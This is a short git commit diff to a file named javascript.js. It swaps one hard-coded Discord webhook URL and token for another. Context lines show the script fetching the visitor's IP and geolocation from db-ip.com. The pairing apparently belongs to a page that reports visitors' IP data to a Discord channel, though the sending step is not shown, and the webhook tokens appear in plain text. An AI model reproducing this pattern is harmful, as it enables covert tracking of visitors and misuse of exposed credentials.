020c7807a2e3cd76894dd92c75c66a01a487e2fe
3godzinyL <111498764+3godzinyL@users.noreply.github.com>
2022-08-26 23:41:50 +0200

    Update javascript.js

--- javascript.js
+++ javascript.js
@@ -1,4 +1,4 @@
-var webHookUrl = "https://discord.com/api/webhooks/1010298730769022997/Jj2-jxfFoOfFYyCekj1VYl_3X1zuAe7Dynvs0FzUdISxUS_RSciYWWYF0eOT5UG3Pw8T";
+var webHookUrl = "https://discordapp.com/api/webhooks/1012818556020326451/YIUGXxOpMIDKTgCoE5hlJY4TWLAyEvggbVwfR-RRUQiDoSuxOYm8NXtOw7vUtZWX-Cfp";
 
 $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
   console.log(JSON.stringify(data, null, 2));
